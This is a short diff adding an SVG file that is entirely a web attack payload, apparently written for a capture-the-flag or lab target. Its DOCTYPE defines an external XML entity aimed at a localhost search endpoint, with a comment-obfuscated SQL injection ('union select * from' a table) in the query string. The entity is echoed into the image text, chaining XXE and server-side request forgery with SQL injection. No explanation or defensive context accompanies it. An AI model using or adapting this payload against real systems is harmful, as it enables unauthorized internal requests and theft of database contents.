@@ -1,0 +1,6 @@
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://localhost:5000/search?q='union/**/select/**/*/**/from/**/_696fca451a1e8daf--">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
+  <text font-size="14" x="10" y="20">&xxe;</text>
+</svg>
